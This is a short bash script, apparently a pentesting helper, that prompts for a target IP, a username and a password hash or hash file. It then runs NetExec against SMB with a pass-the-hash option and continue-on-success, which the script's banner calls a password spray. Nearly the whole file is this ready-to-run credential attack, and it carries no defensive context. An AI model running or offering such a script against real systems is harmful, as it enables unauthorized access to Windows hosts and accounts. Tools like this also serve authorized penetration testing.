#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"

echo -e "${BOLD}${RED}wow ! Password spray  ---<${RESET}"

 
echo "Ip:-"
read ip

echo "username:-"
read username

echo "Provide the hash or file:-"
read hash

nxc smb $ip -u $username -H $hash --continue-on-success --no-brute
